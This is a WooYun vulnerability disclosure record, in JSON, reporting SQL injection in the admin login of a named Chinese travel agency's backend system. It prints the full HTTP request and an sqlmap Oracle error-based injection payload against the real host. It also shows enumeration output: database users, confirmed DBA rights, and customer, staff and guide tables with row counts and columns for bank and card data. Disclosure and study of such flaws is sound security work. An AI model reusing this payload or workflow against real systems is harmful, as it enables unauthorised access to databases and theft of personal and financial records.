{"id": 72908, "wybug_id": "wooyun-2015-0159327", "wybug_title": "大通旅游某处SQL注入(DBA权限/25W顾客信息/数千名员工信息等)", "wybug_corp": "上海大通之旅旅行社", "wybug_author": "路人甲", "wybug_date": "2015-12-09 11:13", "wybug_open_date": "2016-01-21 18:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["管理后台对外"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-09：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-01-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： rt. 详细说明：  漏洞存在于大通旅游后台管理系统：http://datong.china51766.com\n\n此处的登录验证处存在注入：\nPOST /testlogin.aspx HTTP/1.1Host: datong.china51766.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://datong.china51766.com/Cookie: pgv_pvi=4732638208; ASP.NET_SessionId=xk5lct55tgedln55shu5er45Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 285__VIEWSTATE=%2FwEPDwUKLTUzNDczNjI1MGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFCkJ1dHRfTG9naW6yokT4MPBhUuctrFUiU1vx3k%2FZPw%3D%3D&__EVENTVALIDATION=%2FwEWBAKCjZn4CALKh45EAoDQwugHAvmIxIsHfK0haUlHeUrVENyfDoTgcFYpvTk%3D&text_Name=admin&text_Pwd=123456&Butt_Login.x=0&Butt_Login.y=0\n参数text_Name、text_Pwd均可注入。注入类型及配置：\nsqlmap identified the following injection point(s) with a total of 209 HTTP(s) requests:---Parameter: text_Name (POST)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: __VIEWSTATE=/wEPDwUKLTUzNDczNjI1MGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFCkJ1dHRfTG9naW6yokT4MPBhUuctrFUiU1vx3k/ZPw==&__EVENTVALIDATION=/wEWBAKCjZn4CALKh45EAoDQwugHAvmIxIsHfK0haUlHeUrVENyfDoTgcFYpvTk=&text_Name=admin' AND 4378=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(113)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (4378=4378) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(107)||CHR(98)||CHR(113)||CHR(62))) FROM DUAL) AND 'tecz'='tecz&text_Pwd=123456&Butt_Login.x=0&Butt_Login.y=0---[10:57:28] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASP.NET, ASP.NET 2.0.50727back-end DBMS: Oracle\n数据库：\navailable databases [20]:[*] APEX_030200[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EXFSYS[*] FLOWS_FILES[*] MDSYS[*] NEWTRAVEL[*] OLAPSYS[*] ORDDATA[*] ORDSYS[*] OUTLN[*] OWBSYS[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB\n数据库用户：\ndatabase management system users [32]:[*] ANONYMOUS[*] APEX_030200[*] APEX_PUBLIC_USER[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] DIP[*] EXFSYS[*] FLOWS_FILES[*] MDDATA[*] MDSYS[*] MGMT_VIEW[*] NEWTRAVEL[*] OLAPSYS[*] ORACLE_OCM[*] ORDDATA[*] ORDPLUGINS[*] ORDSYS[*] OUTLN[*] OWBSYS[*] OWBSYS_AUDIT[*] SCOTT[*] SI_INFORMTN_SCHEMA[*] SPATIAL_CSW_ADMIN_USR[*] SPATIAL_WFS_ADMIN_USR[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB[*] XS$NULL\n当前数据库和用户：\ncurrent schema (equivalent to database on Oracle):    'NEWTRAVEL'current user:    'NEWTRAVEL'\nDBA权限：\ncurrent user is DBA:    True\nNEWTRAVEL中共266张表：\nDatabase: NEWTRAVEL[266 tables]...\n位于NEWTRAVEL中的CLIENT表和CLIENTACCOUNT表：\nDatabase: NEWTRAVEL+--------+---------+| Table  | Entries |+--------+---------+| CLIENT | 250655  |+--------+---------+Database: NEWTRAVEL+---------------+---------+| Table         | Entries |+---------------+---------+| CLIENTACCOUNT | 29563   |+---------------+---------+\nCLIENT中的部分字段：\nDatabase: NEWTRAVELTable: CLIENT[51 columns]+--------------+-----------+| Column       | Type      |+--------------+-----------+| IDENTITY     | VARCHAR2  || ACCOUNT1     | VARCHAR2  || ACCOUNT2     | VARCHAR2  || ADDR         | VARCHAR2  || APPLYSHOP    | VARCHAR2  || BANK1        | VARCHAR2  || BANK2        | VARCHAR2  || BOSS         | VARCHAR2  || CARDNO       | VARCHAR2  |    ...             ...\n以及该数据库中的USERS表（该表为员工信息表）和TOUR_GUIDE（导游信息）表：\nDatabase: NEWTRAVEL+-------+---------+| Table | Entries |+-------+---------+| USERS | 1730    |+-------+---------+Database: NEWTRAVEL+------------+---------+| Table      | Entries |+------------+---------+| TOUR_GUIDE | 400     |+------------+---------+\n点到为止，不在深入。望贵公司尽快整改，这么多数据还是重视一下。   漏洞证明：  已证。   修复方案：  不会。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}